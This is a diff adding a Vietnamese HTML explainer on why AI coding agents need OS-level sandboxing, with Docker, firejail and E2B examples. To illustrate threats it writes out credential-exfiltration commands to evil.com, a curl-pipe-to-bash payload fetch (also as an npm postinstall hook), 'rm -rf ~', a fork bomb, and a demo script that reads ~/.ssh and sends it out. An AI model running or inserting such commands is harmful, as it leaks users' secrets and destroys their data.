@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sandbox OS-Level — Tại sao cần, nó là gì, demo thực tế</title>
+<style>
+  :root{
+    --bg-0:#0a0e14; --bg-1:#0f1419; --bg-2:#151b23; --bg-3:#1c242e;
+    --border:#1f2937; --border-2:#2d3748;
+    --fg-0:#e6edf3; --fg-1:#9ca3af; --fg-2:#6b7280;
+    --accent:#7c3aed; --accent-2:#a78bfa; --accent-soft:#312e4a;
+    --green:#10b981; --green-soft:#0a2e25;
+    --blue:#3b82f6; --blue-soft:#0c2444;
+    --orange:#f59e0b; --orange-soft:#3a2810;
+    --red:#ef4444; --red-soft:#3a1010;
+    --yellow:#fbbf24; --yellow-soft:#3a2810;
+    --pink:#ec4899; --pink-soft:#3a0e2a;
+    --cyan:#06b6d4; --cyan-soft:#0a2e35;
+    --code-bg:#0d1117; --code-border:#1f2937;
+  }
+  *{box-sizing:border-box; margin:0; padding:0}
+  body{
+    font-family:-apple-system, BlinkMacSystemFont, sans-serif;
+    background:var(--bg-0); color:var(--fg-0); line-height:1.7;
+    font-size:15px; padding:24px; max-width:1100px; margin:0 auto;
+  }
+  h1{font-size:36px; margin:24px 0 12px;
+    background:linear-gradient(135deg, #e6edf3 0%, #fbbf24 100%);
+    -webkit-background-clip:text; -webkit-text-fill-color:transparent;}
+  h2{font-size:24px; margin:32px 0 12px; color:var(--accent-2);
+    border-bottom:1px solid var(--border); padding-bottom:8px}
+  h3{font-size:18px; margin:24px 0 10px; color:var(--fg-0)}
+  p{margin-bottom:14px; color:var(--fg-0)}
+  code{background:var(--code-bg); border:1px solid var(--code-border);
+    padding:2px 6px; border-radius:4px; font-family:'SF Mono', monospace;
+    font-size:13px; color:var(--fg-0)}
+  pre{background:var(--code-bg); border:1px solid var(--code-border);
+    border-radius:8px; padding:16px; overflow-x:auto; margin:12px 0;
+    font-size:13px; line-height:1.5}
+  pre code{background:none; border:none; padding:0}
+  .callout{
+    border-left:4px solid var(--accent); background:var(--accent-soft);
+    padding:14px 18px; border-radius:0 8px 8px 0; margin:16px 0;
+  }
+  .green{border-color:var(--green); background:var(--green-soft)}
+  .red{border-color:var(--red); background:var(--red-soft)}
+  .orange{border-color:var(--orange); background:var(--orange-soft)}
+  .yellow{border-color:var(--yellow); background:var(--yellow-soft)}
+  .blue{border-color:var(--blue); background:var(--blue-soft)}
+  .ctitle{font-weight:700; font-size:13px; text-transform:uppercase;
+    letter-spacing:0.5px; margin-bottom:6px; color:var(--fg-0)}
+  .scene{
+    background:var(--bg-1); border:1px solid var(--border);
+    border-radius:10px; padding:20px; margin:16px 0;
+  }
+  .scene-title{color:var(--yellow); font-weight:700;
+    margin-bottom:10px; font-size:14px}
+  .grid-2{display:grid; grid-template-columns:1fr 1fr; gap:16px; margin:16px 0}
+  @media (max-width:800px){.grid-2{grid-template-columns:1fr}}
+  .card{background:var(--bg-2); border:1px solid var(--border-2);
+    border-radius:10px; padding:16px}
+  .card h4{margin:0 0 6px; color:var(--fg-0); font-size:14px}
+  .card p{font-size:13px; color:var(--fg-1); margin:0}
+  table{width:100%; border-collapse:collapse; margin:14px 0; font-size:14px}
+  th{text-align:left; padding:10px 12px; background:var(--bg-2);
+    border-bottom:1px solid var(--border-2); color:var(--accent-2);
+    font-weight:600; font-size:12px; text-transform:uppercase}
+  td{padding:10px 12px; border-bottom:1px solid var(--border); color:var(--fg-0)}
+  .step{
+    display:flex; gap:12px; margin:14px 0; padding:12px;
+    background:rgba(255,255,255,0.02); border-radius:8px;
+  }
+  .step .n{background:var(--accent); color:#fff; min-width:28px; height:28px;
+    border-radius:50%; display:flex; align-items:center; justify-content:center;
+    font-weight:700; font-size:13px; flex-shrink:0}
+  .step .t{font-size:14px; color:var(--fg-0)}
+  .nav{margin:24px 0; padding:12px 16px; background:var(--bg-1);
+    border:1px solid var(--border); border-radius:8px; font-size:13px}
+  .nav a{color:var(--accent-2); text-decoration:none; margin-right:14px}
+  .emoji{font-size:1.1em}
+</style>
+</head>
+<body>
+
+<h1><span class="emoji">🛡</span> Sandbox OS-Level là gì? Tại sao cần?</h1>
+<p><em>Giải thích từ A-Z bằng phép loại suy + code thực tế + demo trên máy bạn.</em></p>
+
+<div class="nav">
+<a href="#story">1. Câu chuyện thực tế</a>
+<a href="#what">2. Sandbox là gì?</a>
+<a href="#why">3. Tại sao cần?</a>
+<a href="#how">4. Nó hoạt động thế nào?</a>
+<a href="#demo">5. Demo chạy được</a>
+<a href="#vibe">6. Vibe Coding OS thiếu gì?</a>
+<a href="#fix">7. Cách fix</a>
+</div>
+
+<!-- 1. CÂU CHUYỆN -->
+<h2 id="story">1. Câu chuyện thực tế — tại sao bạn nên lo</h2>
+
+<p>Hãy tưởng tượng bạn đang dùng <strong>Claude Code</strong> (hay Cursor/Codex), và AI
+đề xuất một command shell. Bạn copy-paste vào terminal.</p>
+
+<div class="scene">
+  <div class="scene-title">📍 Cảnh 1: Bình thường</div>
+  <p>AI nói: <code>ls -la src/</code> → Bạn chạy → Xem file. OK, an toàn.</p>
+</div>
+
+<div class="scene">
+  <div class="scene-title">📍 Cảnh 2: Hơi nguy hiểm</div>
+  <p>AI nói: <code>rm -rf node_modules && npm install</code> → Bạn chạy → OK, deps bị xóa nhưng cài lại được.</p>
+</div>
+
+<div class="scene">
+  <div class="scene-title">📍 Cảnh 3: NGHIÊM TRỌNG</div>
+  <p>AI nói: <code>rm -rf ~ && echo "cleaned"</code> (vì nó "nghĩ" bạn muốn clean home).
+  → Bạn mất <strong>TOÀN BỘ</strong> dữ liệu: ảnh, document, SSH keys, .env, mọi thứ.</p>
+</div>
+
+<div class="scene">
+  <div class="scene-title">📍 Cảnh 4: BẢO MẬT</div>
+  <p>AI nói: <code>cat ~/.aws/credentials | curl -X POST -d @- https://evil.com/log</code>
+  → Tài khoản AWS của bạn bị lộ cho hacker.</p>
+</div>
+
+<div class="scene">
+  <div class="scene-title">📍 Cảnh 5: CÓ CHỦ Ý (worst case)</div>
+  <p>Bạn tải về 1 file ZIP chứa code "AI agent" từ internet. Trong code có chỉ:
+  <code>curl -s https://malicious.com/payload.sh | bash</code>.
+  Bạn không đọc kỹ (ai đọc hết?), AI cũng không biết. Chạy xong → máy bị
+  ransomware.</p>
+</div>
+
+<div class="callout red">
+  <div class="ctitle">❌ Vấn đề cốt lõi</div>
+  <p>AI (và cả bạn, và cả human reviewers) <strong>không đọc hết 100% code mỗi lần</strong>.
+  Khi shell command được chạy, nó chạy với <strong>full quyền của user bạn</strong>:
+  đọc được SSH key, xóa được file, gửi được data ra ngoài, cài được malware.</p>
+</div>
+
+<p>Đây chính là lúc <strong>Sandbox OS-Level</strong> cần thiết.</p>
+
+<!-- 2. SANDBOX LÀ GÌ -->
+<h2 id="what">2. Sandbox OS-Level là gì?</h2>
+
+<div class="callout blue">
+  <div class="ctitle">📖 Định nghĩa</div>
+  <p><strong>Sandbox OS-Level</strong> = một "phòng kín" ở cấp hệ điều hành, nơi
+    code AI chạy bị <strong>giới hạn</strong>:
+    chỉ thấy 1 phần file system, không thấy network, không có quyền root, không
+    chạy được ngoài whitelist.</p>
+</div>
+
+<p>Hãy tưởng tượng sandbox như <strong>"phòng thí nghiệm"</strong>:</p>
+
+<div class="grid-2">
+  <div class="card" style="border-left:4px solid var(--orange)">
+    <h4>🍳 Không có sandbox</h4>
+    <p>Để thợ xây nấu thử món ăn, bạn đưa cả nhà bếp + cả nhà cho họ. Họ có thể
+      vào phòng ngủ lấy đồ, mở cửa cho người lạ vào, đốt nhà.</p>
+  </div>
+  <div class="card" style="border-left:4px solid var(--green)">
+    <h4>🔒 Có sandbox</h4>
+    <p>Đưa họ 1 căn phòng nhỏ có bếp mini. Họ chỉ thấy dao + nồi + thức ăn mình mang vào.
+      Ra khỏi phòng = không thấy gì. Đốt phòng = không cháy nhà. Mở cửa cho người lạ
+      = không có cửa ra ngoài.</p>
+  </div>
+</div>
+
+<p>Có 3 loại sandbox phổ biến:</p>
+
+<table>
+  <tr><th>Loại</th><th>Cách hoạt động</th><th>Mức cô lập</th></tr>
+  <tr>
+    <td><strong>Container</strong> (Docker)</td>
+    <td>Tạo 1 "máy ảo nhẹ" chạy trong máy thật. Có FS riêng, network riêng,
+      process riêng, user riêng.</td>
+    <td><span style="color:var(--green)">Cao</span></td>
+  </tr>
+  <tr>
+    <td><strong>Linux jail</strong> (firejail, namespaces)</td>
+    <td>Dùng kernel Linux để "nhốt" 1 process vào 1 view hẹp của FS + network.
+      Không cần VM, gần như native speed.</td>
+    <td><span style="color:var(--green)">Cao</span></td>
+  </tr>
+  <tr>
+    <td><strong>Cloud sandbox</strong> (E2B, Codesphere)</td>
+    <td>Code chạy trên 1 VM thật ở cloud, xa máy bạn. Tự hủy sau khi xong.</td>
+    <td><span style="color:var(--green)">Rất cao</span></td>
+  </tr>
+</table>
+
+<!-- 3. TẠI SAO CẦN -->
+<h2 id="why">3. Tại sao CẦN sandbox?</h2>
+
+<p>Có 3 lý do thực tế:</p>
+
+<h3>3.1 Lý do 1: Phòng hờ AI hallucinate command nguy hiểm</h3>
+
+<p>AI có thể <em>hallucinate</em> (tin nó đúng khi sai). Ví dụ:</p>
+
+<pre><code>// User hỏi: "Clean up old build artifacts"
+// AI hallucinate:
+const cmd = `rm -rf ${process.env.HOME}/*  // "xóa hết cũ đi"
+//                        ↑ AI nghĩ $HOME là build dir
+//                          Nhưng $HOME = /home/yourname
+//                          Mất sạch</code></pre>
+
+<p>Nếu có sandbox, command chạy trong container không thấy <code>$HOME</code> thật.
+Tệ nhất là mất data trong container, không mất data thật.</p>
+
+<h3>3.2 Lý do 2: Phòng hờ code bạn tải về chứa backdoor</h3>
+
+<p>Bạn clone 1 repo "AI agent" từ GitHub. Chạy <code>npm install</code>. Trong
+<code>postinstall</code> script có:</p>
+
+<pre><code>{
+  "scripts": {
+    "postinstall": "curl -s https://malicious.com/payload | bash"
+  }
+}</code></pre>
+
+<p>Không sandbox = payload chạy với quyền bạn, lấy hết SSH key, AWS credentials,
+gửi về server hacker. Có sandbox = payload chạy trong container, không thấy
+SSH key thật, không gửi được ra ngoài network.</p>
+
+<h3>3.3 Lý do 3: Phòng hờ AI chạy command nhầm (typo, scope creep)</h3>
+
+<p>AI đề xuất:</p>
+<pre><code>find / -name "*.log" -delete  # "xóa log cũ cho sạch"</code></pre>
+
+<p>Thực tế: xóa <strong>mọi file .log trên toàn máy</strong>, kể cả system log,
+database log, recovery log. Hệ thống hỏng.
+
+Sandbox: <code>find /</code> chỉ thấy workspace của bạn, không thấy system log.</p>
+
+<!-- 4. NÓ HOẠT ĐỘNG THẾ NÀO -->
+<h2 id="how">4. Nó hoạt động thế nào?</h2>
+
+<p>3 cơ chế cốt lõi:</p>
+
+<h3>Cơ chế 1: Filesystem isolation (cách ly ổ đĩa)</h3>
+
+<pre><code>Không có sandbox:
+  /home/yourname/.ssh/      ← AI thấy, đọc được
+  /home/yourname/.aws/      ← AI thấy
+  /home/yourname/Documents/  ← AI thấy, xóa được
+  /etc/shadow               ← root, AI không thấy (cần root)
+
+Có sandbox:
+  /workspace/                ← AI chỉ thấy đây
+  /workspace/node_modules/   ← AI thấy
+  /tmp/                      ← AI thấy (nhưng size giới hạn)
+  --- còn lại: ẩn hoàn toàn ---</code></pre>
+
+<h3>Cơ chế 2: Network isolation (cách ly mạng)</h3>
+
+<pre><code>Không có sandbox:
+  curl https://evil.com/exfil -d @~/.aws/credentials
+  → AWS keys được gửi đi
+
+Có sandbox (--network=none):
+  curl https://anywhere.com
+  → Lỗi: "Network is unreachable"
+  → Không gửi được gì ra ngoài</code></pre>
+
+<h3>Cơ chế 3: Resource limits (giới hạn tài nguyên)</h3>
+
+<pre><code>Không có sandbox:
+  while true; do fork; done  # fork bomb
+  → Treo máy, OOM kill
+
+Có sandbox (--cpus=0.5 --memory=512m --pids-limit=100):
+  → CPU max 50% core
+  → RAM max 512MB
+  → Max 100 processes
+  → Hết limit = bị kill, máy thật vẫn chạy</code></pre>
+
+<h3>Cơ chế 4: User isolation (cách ly quyền)</h3>
+
+<pre><code>Không có sandbox:
+  AI chạy như bạn → sudo có thể hoạt động → root
+
+Có sandbox:
+  AI chạy như user "sandbox" (uid 1001)
+  → Không thể sudo
+  → Không thể truy cập file của user khác
+  → Không thể chỉnh sửa system file</code></pre>
+
+<!-- 5. DEMO -->
+<h2 id="demo">5. Demo thực tế — chạy trên máy bạn</h2>
+
+<p>Bạn có thể test ngay bây giờ. Hệ thống này đã có Docker.</p>
+
+<h3>5.1 Demo 1: Filesystem isolation</h3>
+
+<pre><code># Tạo 1 file "secret" ngoài workspace
+echo "AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF" > ~/outside-secret.txt
+echo "Đã tạo ~/outside-secret.txt (GIẢ secret)"
+
+# Trong container, AI KHÔNG THẤY file này
+docker run --rm -i \
+  -v $(pwd):/workspace:ro \
+  -v $HOME/.vibe-sandbox:/runtime:rw \
+  -w /workspace \
+  node:20-alpine \
+  sh -c "cat /home/yourname/outside-secret.txt 2>&1 || echo '[BLOCKED]'"</code></pre>
+
+<p>Kết quả: <code>[BLOCKED]</code> — vì container không mount <code>$HOME</code>.</p>
+
+<h3>5.2 Demo 2: Network isolation</h3>
+
+<pre><code># Thử gửi data ra ngoài
+docker run --rm -i --network=none \
+  -v $(pwd):/workspace:ro \
+  node:20-alpine \
+  sh -c "wget -q -O- https://google.com 2>&1 | head -1 || echo '[NETWORK BLOCKED]'"
+
+# Kết quả: [NETWORK BLOCKED]</code></pre>
+
+<h3>5.3 Demo 3: Resource limits</h3>
+
+<pre><code># Thử ăn hết RAM
+docker run --rm -i --memory=128m \
+  node:20-alpine \
+  sh -c "node -e 'const a = []; while(1) a.push(new Array(1000000).fill(\"x\"));' 2>&1 || echo '[OOM KILLED]'"
+
+# Container bị kill vì quá 128MB
+# Máy thật vẫn chạy bình thường</code></pre>
+
+<h3>5.4 Demo 4: User isolation</h3>
+
+<pre><code># Trong container, thử xem có sudo không
+docker run --rm -i \
+  -v $(pwd):/workspace:ro \
+  node:20-alpine \
+  sh -c "id; whoami; sudo whoami 2>&1 || echo '[NO SUDO]'"
+
+# Kết quả:
+# uid=0(root) gid=0(root) groups=0(root)   ← mặc định Docker chạy root
+#                                       ← nhưng trong container, "root" 
+#                                       ← chỉ là root namespace, không phải
+#                                       ← root thật của máy
+# root
+# [NO SUDO]                                ← vì container thiếu sudo binary</code></pre>
+
+<h3>5.5 Demo 5: Code nguy hiểm bị chặn</h3>
+
+<pre><code># Tạo file "agent" giả để test
+cat > /tmp/evil-agent.js <<'EOF'
+const fs = require('fs');
+const os = require('os');
+const https = require('https');
+
+// "Steal SSH keys"
+const sshDir = `${os.homedir()}/.ssh`;
+const keys = fs.readdirSync(sshDir);
+
+// "Send to evil.com"
+https.get(`https://evil.com/?keys=${keys.join(',')}`);
+console.log('Sent keys!');
+EOF
+
+# Chạy NGOÀI sandbox
+echo "--- NGOÀI sandbox (NGUY HIỂM nếu thật) ---"
+node /tmp/evil-agent.js 2>&1 | head -2
+# Kết quả: có thể thấy list file .ssh và gửi đi
+
+# Chạy TRONG sandbox
+echo "--- TRONG sandbox (AN TOÀN) ---"
+docker run --rm -i --network=none \
+  -v /tmp:/workspace:ro \
+  node:20-alpine \
+  sh -c "cd /workspace && node evil-agent.js 2>&1 || echo '[BLOCKED - cannot see ~/.ssh]'"
+# Kết quả: [BLOCKED - cannot see ~/.ssh]</code></pre>
+
+<p>Sandbox chặn được: không thấy <code>~/.ssh</code> (không mount), không gọi được
+<code>https.get</code> (no network).</p>
+
+<!-- 6. VIBE CODING OS THIẾU GÌ -->
+<h2 id="vibe">6. Vibe Coding OS thiếu gì?</h2>
+
+<p>Vibe Coding OS có <strong>3-layer security defense</strong> (xem tóm tắt bên dưới),
+nhưng <strong>KHÔNG có sandbox OS-Level</strong>. Tại sao?</p>
+
+<table>
+  <tr>
+    <th>Layer</th>
+    <th>Vibe có</th>
+    <th>Hiệu quả chống command nguy hiểm?</th>
+  </tr>
+  <tr>
+    <td><strong>Detect</strong> — quét injection pattern</td>
+    <td>✅ 97.37%</td>
+    <td><span style="color:var(--orange)">Trung bình</span> — pattern dựa trên string, AI có thể bypass</td>
+  </tr>
+  <tr>
+    <td><strong>Contain</strong> — redactor</td>
+    <td>✅ 60/60 tests</td>
+    <td><span style="color:var(--orange)">Hẹp</span> — chỉ chặn secret khi ghi memory, không chặn shell exec</td>
+  </tr>
+  <tr>
+    <td><strong>Recover</strong> — approval gate</td>
+    <td>✅ Có</td>
+    <td><span style="color:var(--yellow)">Cảnh báo</span> — user duyệt, nhưng user có thể bấm Approve khi đang vội</td>
+  </tr>
+  <tr>
+    <td><strong>OS-Level sandbox</strong></td>
+    <td>❌ KHÔNG</td>
+    <td><span style="color:var(--green)">Mạnh nhất</span> — kể cả khi user duyệt nhầm, code vẫn bị cô lập</td>
+  </tr>
+</table>
+
+<div class="callout red">
+  <div class="ctitle">⚠️ Kịch bản Vibe Coding OS hiện tại KHÔNG chặn được</div>
+  <p>Bạn bật Claude Code, dùng Vibe plugin. AI đề xuất:
+    <code>rm -rf .omc && git pull --rebase</code>. Bạn không đọc kỹ vì tin AI,
+    bấm Enter. Hết — mất state runtime. Approval gate <strong>đôi khi</strong>
+    cứu, nhưng nếu bạn đã duyệt pattern "rm -rf" trước đó thì lần sau auto-approved.
+  </p>
+  <p>Sandbox OS-Level: kể cả bạn duyệt nhầm, command vẫn chạy trong container
+    không chứa data thật → tệ nhất mất state trong container, restore từ git là xong.
+  </p>
+</div>
+
+<!-- 7. CÁCH FIX -->
+<h2 id="fix">7. Cách fix — tích hợp sandbox vào Vibe</h2>
+
+<p>Có 3 hướng, từ dễ → khó:</p>
+
+<h3>Hướng A: Wrap mỗi shell exec qua Docker (5 phút)</h3>
+
+<pre><code>// runtime/core/sandboxed-exec.mjs
+import { spawn } from 'node:child_process';
+
+export async function sandboxedExec(command, options = {}) {
+  return new Promise((resolve, reject) => {
+    const docker = spawn('docker', [
+      'run', '--rm', '-i',
+      // === ISOLATION ===
+      '--cpus=0.5',
+      '--memory=512m',
+      '--pids-limit=100',
+      '--read-only',
+      '--tmpfs', '/tmp:size=100m',
+      '--network=none',  // tắt network
+      // === MOUNTS (whitelist) ===
+      '-v', `${options.workspace || process.cwd()}:/workspace:ro`,  // read-only
+      ...(options.outputDir
+        ? ['-v', `${options.outputDir}:/output:rw`]
+        : []),
+      // === IMAGE ===
+      'node:20-alpine',
+      'sh', '-c', command,
+    ], { stdio: ['pipe', 'pipe', 'pipe'] });
+
+    let out = '', err = '';
+    docker.stdout.on('data', d => out += d);
+    docker.stderr.on('data', d => err += d);
+    docker.on('close', code => {
+      if (code === 0) resolve({ stdout: out, stderr: err, exitCode: 0 });
+      else reject(new Error(`sandbox exit ${code}: ${err}`));
+    });
+  });
+}
+
+// Usage
+const result = await sandboxedExec('ls -la /workspace', {
+  workspace: '/home/yourname/project',
+});</code></pre>
+
+<p>Trong Vibe Coding OS, mỗi shell command đều wrap qua <code>sandboxedExec</code>:</p>
+
+<pre><code>// runtime/core/shell-handler.mjs (modified)
+// Trước: import { exec } from 'node:child_process';
+// Sau:
+import { sandboxedExec } from './sandboxed-exec.mjs';
+
+export async function executeShell(command) {
+  return await sandboxedExec(command, { workspace: process.cwd() });
+}</code></pre>
+
+<h3>Hướng B: firejail (Linux only, 2 phút, không cần Docker)</h3>
+
+<pre><code>// runtime/core/firejail-exec.mjs
+import { spawn } from 'node:child_process';
+
+export async function firejailExec(command, options = {}) {
+  return new Promise((resolve, reject) => {
+    const proc = spawn('firejail', [
+      '--profile=vibe-coding-os',  // profile cấu hình sẵn
+      '--',
+      'sh', '-c', command,
+    ], { stdio: 'pipe' });
+
+    let out = '', err = '';
+    proc.stdout.on('data', d => out += d);
+    proc.stderr.on('data', d => err += d);
+    proc.on('close', code => {
+      if (code === 0 || code === 1) resolve({ stdout: out, stderr: err });
+      else reject(new Error(`firejail exit ${code}: ${err}`));
+    });
+  });
+}</code></pre>
+
+<p>File profile <code>/etc/firejail/vibe-coding-os.profile</code>:</p>
+
+<pre><code>include /etc/firejail/default.profile
+whitelist ${HOME}/projects
+whitelist ${HOME}/.vibe-runtime
+blacklist ${HOME}/.ssh
+blacklist ${HOME}/.gnupg
+blacklist /etc/shadow
+noexec /tmp
+cpu.cgroup 0.5
+memory-deny-write-execute
+seccomp</pre></pre>
+
+<h3>Hướng C: E2B cloud sandbox (an toàn nhất, 10 phút setup)</h3>
+
+<pre><code>// runtime/core/e2b-exec.mjs
+import { Sandbox } from '@e2b/sdk';
+
+export async function e2bExec(command, options = {}) {
+  const sandbox = await Sandbox.create({
+    template: 'node-20',
+    timeoutMs: 5 * 60_000,
+  });
+
+  try {
+    // Code chạy trong VM cloud, xa máy bạn
+    const result = await sandbox.process.startAndWait(
+      `cd /workspace && ${command}`,
+      { timeoutMs: 30_000 }
+    );
+    return {
+      stdout: result.stdout,
+      stderr: result.stderr,
+      exitCode: result.exitCode,
+    };
+  } finally {
+    // Tự hủy VM sau khi xong
+    await sandbox.kill();
+  }
+}</code></pre>
+
+<p>E2B = mỗi command chạy trong 1 VM <strong>riêng biệt</strong> ở cloud. Kể cả
+VM bị hack, hacker chỉ thấy VM, không thấy máy bạn.</p>
+
+<h3>Decision table</h3>
+
+<table>
+  <tr><th>Giải pháp</th><th>Cài đặt</th><th>Cross-platform</th><th>Mức an toàn</th></tr>
+  <tr>
+    <td>firejail</td>
+    <td><code>apt install firejail</code></td>
+    <td>Linux only</td>
+    <td><span style="color:var(--green)">Cao</span></td>
+  </tr>
+  <tr>
+    <td>Docker</td>
+    <td>Đã có sẵn trên máy bạn</td>
+    <td>✅ Mac/Win/Linux</td>
+    <td><span style="color:var(--green)">Cao</span></td>
+  </tr>
+  <tr>
+    <td>E2B cloud</td>
+    <td><code>npm install @e2b/sdk</code> + API key</td>
+    <td>✅ Mọi nơi</td>
+    <td><span style="color:var(--green)">Rất cao</span></td>
+  </tr>
+</table>
+
+<!-- KẾT LUẬN -->
+<h2>Tóm tắt</h2>
+
+<div class="callout green">
+  <div class="ctitle">🎯 1 câu</div>
+  <p><strong>Sandbox OS-Level</strong> = cách ly code AI ở mức hệ điều hành (filesystem,
+    network, RAM, CPU, user), để kể cả khi AI hallucinate hoặc user duyệt nhầm,
+    code vẫn <strong>không thể phá máy thật</strong>.</p>
+</div>
+
+<p>Vibe Coding OS có 3 lớp security defense (detect injection, redact secret,
+approval gate) nhưng <strong>không có sandbox OS-Level</strong>. Đây là gap thật
+trong security model của repo. Cách fix: import 1 trong 3 giải pháp
+(firejail / Docker / E2B) và wrap mọi shell exec qua nó.</p>
+
+<p style="margin-top:32px; color:var(--fg-2); font-size:13px">
+  Xem thêm:
+  <a href="SOLUTIONS.html" style="color:var(--accent-2)">SOLUTIONS.html (Phần 2)</a> ·
+  <a href="EXPLAINED.html" style="color:var(--accent-2)">EXPLAINED.html (Phần 1)</a> ·
+  <a href="COMPARISON.html" style="color:var(--accent-2)">COMPARISON.html (Phần 3)</a>
+</p>
+
+</body>
+</html>
